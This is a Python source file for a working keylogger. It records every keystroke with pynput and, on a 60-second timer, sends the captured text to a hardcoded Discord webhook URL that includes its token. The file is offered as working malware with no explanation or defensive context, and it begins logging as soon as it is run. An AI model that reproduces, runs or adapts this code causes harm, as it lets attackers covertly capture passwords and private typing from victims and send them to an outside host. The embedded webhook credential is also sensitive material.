from discord import Webhook, SyncWebhook
import pynput.keyboard
import threading
import requests


class Keylogger:
    def __init__(self):
        self.log = ''
        
    def key_press(self,key):
        try:
            current_key = str(key.char)
            self.append_to_log(current_key)
        except AttributeError:
            if key == key.space:
                current_key=" "
            else:
                current_key=" "+str(key)+" "
            self.append_to_log(current_key)
    
    def append_to_log(self,string):
        self.log = self.log + string

    def check_connectivity(self):
        try:
            response = requests.get("https://google.com", timeout=5)
            return True
        except requests.ConnectionError:
            return False

    def disc_report(self,message):
        wbhu="https://discord.com/api/webhooks/1165680409938501724/M-3tbUPibcVLl92h5KF1Guve17SJzYCa5XOQMRKonF4cH9t2mLunynJKSX2ZH0eTAwBT"
        
        webhook = SyncWebhook.from_url(wbhu)
        if message != "":
            webhook.send(message)

    def send(self):
        connected = self.check_connectivity()
        if connected == True:
            self.disc_report(self.log)
            self.log = ""
        else:
            pass
        timer = threading.Timer(60,self.send)
        timer.start()
       
    def start(self):
        key_lis = pynput.keyboard.Listener(on_press=self.key_press)  #on_press---> callback function

        with key_lis:
            self.send()
            key_lis.join()

k=Keylogger()
k.start()
